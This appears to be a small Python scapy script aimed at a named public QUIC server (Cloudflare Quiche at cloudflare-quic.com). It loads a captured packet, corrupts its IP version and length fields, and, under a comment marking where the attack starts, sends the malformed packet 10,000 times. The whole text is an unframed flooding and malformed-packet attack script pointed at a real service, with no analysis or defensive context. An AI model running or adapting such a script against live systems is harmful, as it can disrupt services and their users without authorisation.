# Server : Cloudflare Quiche
# Link : https://cloudflare-quic.com/

from scapy.all import *

packetCollection = rdpcap("packet.pcapng")
packet = packetCollection[0]

# Changes applied

packet[IP].version = 10     # Changed IP Version
packet[IP].len = 65535      # Changed the header length in IP version

packet.show()

# Attack starts

cnt=1

while cnt <= 10000:
    sendp(packet)
    cnt = cnt + 1
